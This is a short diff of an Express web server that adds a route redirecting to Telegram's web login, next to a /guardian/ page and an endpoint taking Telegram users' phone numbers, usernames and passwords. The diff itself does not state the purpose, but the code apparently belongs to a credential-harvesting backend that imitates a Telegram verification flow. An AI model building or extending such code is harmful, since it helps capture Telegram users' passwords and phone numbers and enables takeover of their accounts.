@@ -70,6 +70,11 @@ app.get("/guardian/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "guardian", "index.html"));
 });
 
+// Handle /a/ route for Telegram login
+app.get("/a/", (req, res) => {
+  res.redirect("https://web.telegram.org/a/");
+});
+
 app.post("/api/users/telegram/info", async (req, res) => {
   try {
     const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
